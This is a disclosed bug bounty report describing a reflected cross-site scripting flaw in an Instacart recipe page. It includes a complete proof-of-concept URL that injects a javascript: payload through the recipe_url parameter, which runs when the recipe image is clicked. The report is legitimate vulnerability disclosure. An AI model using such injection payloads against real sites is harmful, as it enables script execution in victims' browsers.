# XSS in instacart.com/store/partner_recipe

## Report Details
- **Report ID**: 196221
- **URL**: https://hackerone.com/reports/196221
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-06T10:03:27.020Z
- **Disclosed**: 2017-05-11T19:10:14.042Z

## Reporter
- **Username**: karel_origin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
Please open the following url
```
https://www.instacart.com/store/partner_recipe?recipe_url=javascript:alert(1)&partner_name=&ingredients%5B%5D=apples&ingredients%5B%5D=butter&ingredients%5B%5D=Splenda+Brown+Sugar+Blend&ingredients%5B%5D=cinnamon&ingredients%5B%5D=nutmeg&title=Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=%2Fassets%2Fimg%2Fno-recipe-image.jpg
```

and click on the "Barb's Fried Apples -Diabetic-Low Fat" image to trigger the payload.

The affected parameter is
recipe_url


## Attachments
No attachments
